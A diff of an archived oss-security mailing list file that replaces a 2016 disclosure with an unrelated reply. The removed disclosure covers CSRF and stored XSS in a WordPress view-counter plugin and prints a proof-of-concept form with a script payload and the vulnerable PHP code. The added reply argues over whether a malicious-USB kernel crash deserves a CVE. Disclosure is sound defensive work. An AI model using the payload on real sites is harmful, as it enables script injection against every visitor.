@@ -1,169 +1,34 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/16/3
-Message-ID: <CAOmn9FQsQy9mCApHvaV-BCKiXM8M297K3iCLz-dUBMueHMu=BQ@mail.gmail.com>
-Date: Sat, 16 Apr 2016 13:46:21 +0530
-From: shravan kumar <cor3sm4sh3r@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CSRF and Stored XSS in Kento post viewer counter wordpress Plugin 2.8
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/08/18/23
+Message-ID: <20160818195024.GB17944@1wt.eu>
+Date: Thu, 18 Aug 2016 21:50:24 +0200
+From: Willy Tarreau <w@....eu>
+To: Adam Maris <amaris@...hat.com>
+Cc: oss-security@...ts.openwall.com, Marcus Meissner <meissner@...e.de>, Greg KH <greg@...ah.com>, cve-assign@...re.org, security@...nel.org
+Subject: Re: Re: CVE Request: Linux kernel crash of OHCI when plugging in malicious USB devices
 Content-Type: text/plain; charset=utf-8
 
-Hello ,
+On Thu, Aug 18, 2016 at 08:16:27PM +0200, Adam Maris wrote:
+> Attacker doesn't necessarily need to have physical access to USB port. He
+> can somehow
+> hand USB off to the victim that will with good intentions stick it to his
+> USB port, unexpectedly
+> causing kernel panic. Difference is that one probably wouldn't pour glue or
+> corrosive liquid
+> into his USB port believing that nothing bad will happen.
 
-I would like to disclose  CSRF and stored XSS vulnerability in Kento post
-view counter plugin version 2.8 .
+Well, it happened to me when I was a kid, with a PS/2 port. I handed off
+a device to someone of trust to connect to the PS/2 port and parallel port.
+(PS/2 to pick the +5V). I wired it wrong and the motherboard died, as
+amazing as it seems and the person didn't find it fun as it was not his PC.
 
-The vulnerable Fields for XSS are
+So yes it can be done even without suspecting. It's easy to do whatever you
+want using a USB stick. You can use the 3W it provides to charge a 300V
+capacitor and discharge it on the D+/D- to test the clamping diodes
+robustness, etc...
 
-   - kento_pvc_numbers_lang
-   - kento_pvc_today_text
-   - kento_pvc_total_text
+Thus I don't think either that something "only causing a panic" deserves
+a CVE. It needs to be fixed however, for sure!
 
-The combination of CSRF and XSS in this plugin can lead to huge damage of
-the website, as the two fields kento_pvc_today_text and
-kento_pvc_total_text are reflected on all authenticated users as well as
-non-authenticated user ,all the post have a footer which shows this two
-parameter reflected in them ,so if an attacker successfully attacks a
-website almost all the pages on that website will execute the malicious
-javascript payload on all the clients browsers visiting that website.every
-user visiting the website will be affected.
-
-
-
-
-The plugin can be found at
-https://wordpress.org/plugins/kento-post-view-counter/
-
-
-This CSRF is tested on latest wordpress installation 4.4.2 using firefox
-browser.  and chrome.
-
-
-The Code for CSRF.html is
-
-<html>
-  <body>
-    <form action="
-http://targetsite/wp-admin/admin.php?page=kentopvc_settings" method="POST">
-      <input type="hidden" name="kentopvc_hidden" value="Y" />
-      <input type="hidden" name="option_page"
-value="kento_pvc_plugin_options" />
-      <input type="hidden" name="action" value="update" />
-      <input type="hidden" name="_wpnonce" value="" />
-      <input type="hidden" name="_wp_http_referer" value="" />
-      <input type="hidden" name="kento_pvc_posttype[post]" value="1" />
-      <input type="hidden" name="kento_pvc_posttype[page]" value="1" />
-      <input type="hidden" name="kento_pvc_posttype[attachment]" value="1"
-/>
-      <input type="hidden" name="kento_pvc_posttype[revision]" value="1" />
-      <input type="hidden" name="kento_pvc_posttype[nav_menu_item]"
-value="1" />
-      <input type="hidden" name="kento_pvc_numbers_lang" value="" />
-      <input type="hidden" name="kento_pvc_today_text"
-value="&#x22;<script>alert(1);</script><img
-src=&#x22;b" />
-      <input type="hidden" name="kento_pvc_total_text" value="" />
-      <input type="hidden" name="Submit" value="Save Changes" />
-      <input type="submit" value="Submit form" />
-    </form>
-  </body>
-</html>
-
-The Vulnerable page is
-
-wp-content\plugins\kento-post-view-counter\kento-pvc-admin.php
-
-The code Reponsible for XSS :
-
-if($_POST['kentopvc_hidden'] == 'Y') {
-//Form data sent
-if(empty($_POST['kento_pvc_hide']))
-{
-$kento_pvc_hide ="";
-}
-else
-{
-$kento_pvc_hide = $_POST['kento_pvc_hide'];
-}
-update_option('kento_pvc_hide', $kento_pvc_hide);
-
-
-
-if(empty($_POST['kento_pvc_posttype']))
-{
-$kento_pvc_posttype ="";
-}
-else
-{
-$kento_pvc_posttype = $_POST['kento_pvc_posttype'];
-}
-update_option('kento_pvc_posttype', $kento_pvc_posttype);
-if(empty($_POST['kento_pvc_uniq']))
-{
-$kento_pvc_uniq ="";
-}
-else
-{
-$kento_pvc_uniq = $_POST['kento_pvc_uniq'];
-}
-update_option('kento_pvc_uniq', $kento_pvc_uniq);
-
-
-$kento_pvc_numbers_lang = $_POST['kento_pvc_numbers_lang'];
-update_option('kento_pvc_numbers_lang', $kento_pvc_numbers_lang);
-
-$kento_pvc_today_text = $_POST['kento_pvc_today_text'];
-update_option('kento_pvc_today_text', $kento_pvc_today_text);
-
-$kento_pvc_total_text = $_POST['kento_pvc_total_text'];
-update_option('kento_pvc_total_text', $kento_pvc_total_text);
-
-
---------------------------snip-----------------------
-------------------snip ------------------------------
-
-
-
-
-<input type="text" size="20" name="kento_pvc_numbers_lang"
-id="kento-pvc-numbers-lang"   value ="<?php if
-(isset($kento_pvc_numbers_lang)) echo $kento_pvc_numbers_lang; ?>"
-placeholder="0,1,2,3,4,5,6,7,8,9"   /><br />**Write numbers in your
-language as following 0,1,2,3,4,5,6,7,8,9<br />
-   Left blank if you are in English.
-
-
-
-<tr valign="top">
-<th scope="row">Text For Today View</th>
-<td style="vertical-align:middle;">
-
-   <input type="text" size="20" name="kento_pvc_today_text"
-id="kento-pvc-today-text"   value ="<?php if (isset($kento_pvc_today_text))
-echo $kento_pvc_today_text; ?>" placeholder="Views Today "   />
-
-</td>
-</tr>
-
-
-<tr valign="top">
-<th scope="row">Text For Total View</th>
-<td style="vertical-align:middle;">
-
-   <input type="text" size="20" name="kento_pvc_total_text"
-id="kento-pvc-total-text"   value ="<?php if (isset($kento_pvc_total_text))
-echo $kento_pvc_total_text; ?>" placeholder="Total Views "   />
-
-</td>
-</tr>
-
-
-
-No anti-CSRF token used on this form  :
-
-All though the WordPress sends the _wpnonce value but it does not protect
-this form against CSRF.
-
-
--- 
-Shravan Kumar
-
+Regards,
+Willy
